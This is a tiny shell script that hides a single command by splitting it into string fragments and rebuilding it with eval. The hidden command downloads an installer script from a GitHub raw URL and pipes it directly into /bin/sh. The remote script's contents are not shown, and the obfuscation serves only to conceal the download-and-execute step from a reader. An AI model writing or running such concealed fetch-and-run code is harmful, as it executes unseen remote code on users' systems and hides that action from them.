z="
";Fz='hubu';Iz='nt.c';Bz=' htt';Hz='onte';Rz='stal';Pz='/mai';Vz=' | /';Wz='bin/';Ez='.git';Jz='om/e';Qz='n/in';Gz='serc';Kz='mil2';Oz='omeh';Tz='sh -';Mz='hann';Dz='/raw';Lz='37/c';Cz='ps:/';Xz='sh';Sz='ler.';Az='wget';Uz='qO -';Nz='el-r';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"